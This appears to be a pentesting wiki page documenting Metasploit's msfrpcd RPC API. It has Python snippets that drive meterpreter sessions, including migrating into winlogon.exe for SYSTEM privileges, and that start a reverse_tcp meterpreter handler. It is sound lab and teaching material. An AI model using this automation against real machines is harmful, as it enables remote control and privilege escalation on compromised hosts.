---
title: msfrpcd MessagePack RPC API
slug: msfrpcd-api
category: tools
updated: 2026-07-26
summary: "Automate meterpreter/msfconsole via HTTP+MessagePack API — start daemon, auth, console/session control, Python snippets"
tags: [metasploit, msfrpcd, rpc, msgpack, automation, meterpreter, python]
sensitive: false
---

# msfrpcd MessagePack RPC API

## When to use
Need to drive meterpreter non-interactively: background automation, blind exploitation from a script, or when `getsystem` via RPC errors (`undefined method 'config'`) and you need `migrate` instead.

## Key facts / commands

**Start daemon**:
```bash
msfrpcd -P <password> -a 127.0.0.1 -p 55553 -S -U msf
# -S = no SSL (local only); -a = bind address; default port 55553
```

**API endpoint**: `POST http://127.0.0.1:55553/api/`
**Header**: `Content-Type: binary/message-pack`
**Body**: MessagePack-encoded array `[method, arg1, arg2, ...]`

**Python helper**:
```python
import msgpack, requests

API  = 'http://127.0.0.1:55553/api/'
HDRS = {'Content-Type': 'binary/message-pack'}

def call(method, *args):
    body = msgpack.packb([method] + list(args), use_bin_type=True)
    r = requests.post(API, data=body, headers=HDRS)
    return msgpack.unpackb(r.content, raw=False, strict_map_key=False)

# Auth
tok = call('auth.login', 'msf', '<password>')['token']

# List sessions
sessions = call('session.list', tok)
sid = str(list(sessions.keys())[0])   # keys are integers; convert to str for run_single

# Run meterpreter command
call('session.meterpreter_run_single', tok, sid, 'migrate -N winlogon.exe')

# Read output (poll after a second)
import time; time.sleep(2)
out = call('session.meterpreter_read', tok, sid)
print(out.get('data', ''))
```

**Console-based (alternative)**:
```python
cid = call('console.create', tok)['id']
call('console.write', tok, cid, 'use exploit/multi/handler\n')
call('console.write', tok, cid, 'set PAYLOAD windows/x64/meterpreter/reverse_tcp\n')
call('console.write', tok, cid, 'set LHOST 0.0.0.0\nset LPORT 4444\nrun -j\n')
time.sleep(1)
print(call('console.read', tok, cid)['data'])
```

**Key RPC methods**:
| Method | Args (after token) | Returns |
|---|---|---|
| `auth.login` | user, pass | `{token: ...}` |
| `session.list` | — | `{int_id: {info...}}` |
| `session.meterpreter_run_single` | sid (str), cmd | `{result: 'success'}` |
| `session.meterpreter_read` | sid (str) | `{data: '...'}` |
| `console.create` | — | `{id: str}` |
| `console.write` | cid, data | — |
| `console.read` | cid | `{data: str, prompt: str}` |
| `job.list` | — | `{int_id: name}` |

## Gotchas
- `strict_map_key=False` is **required** in `msgpack.unpackb` — session IDs are integer keys in the response map; without this flag, msgpack raises `TypeError`.
- `session.meterpreter_run_single` takes `sid` as a **string** even though `session.list` returns integer keys.
- `getsystem` via RPC raises `undefined method 'config'` — use `migrate -N winlogon.exe` instead. See [[windows-sedebugprivilege-migrate]].
- Output is async — always `sleep` + `meterpreter_read` after commands with latency (migration, file ops).
- `-S` (no SSL) is safe for localhost-only binding; do not expose port 55553 externally.

## References
- Relacionado: [[windows-sedebugprivilege-migrate]], [[windows-nssm-job-escape]], [[privilege-escalation]], [[reverse-shells]]
- Evidence: a Windows lab — automation of migrate + session management without interactive msfconsole
- Metasploit wiki: https://docs.metasploit.com/docs/development/developing-modules/rpc/how-to-use-msf-rpc-api.html
